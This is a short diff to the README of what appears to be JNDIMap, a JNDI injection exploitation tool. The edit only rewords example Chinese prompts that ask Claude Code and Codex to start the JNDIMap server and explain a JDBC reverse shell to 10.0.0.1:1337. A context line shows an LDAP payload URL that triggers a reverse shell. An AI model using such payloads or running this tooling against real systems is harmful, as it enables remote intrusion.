@@ -41,10 +41,10 @@ ldap://10.0.0.1:1389/Basic/ReverseShell/10.0.0.1/1337
 npx skills add X1r0z/JNDIMap -g
 
 # Claude Code
-claude '/jndi-map 启动 JNDIMap 服务器并告诉我在 10.0.0.1:1337 上使用 JDBC 反弹 shell 的方式'
+claude '/jndi-map 启动 JNDIMap 服务器并告诉我如何在 10.0.0.1:1337 上使用 JDBC 反弹 shell'
 
 # Codex
-codex '$jndi-map 启动 JNDIMap 服务器并告诉我在 10.0.0.1:1337 上使用 JDBC 反弹 shell 的方式'
+codex '$jndi-map 启动 JNDIMap 服务器并告诉我如何在 10.0.0.1:1337 上使用 JDBC 反弹 shell'
 ```
 
 ## 🚩 功能特性
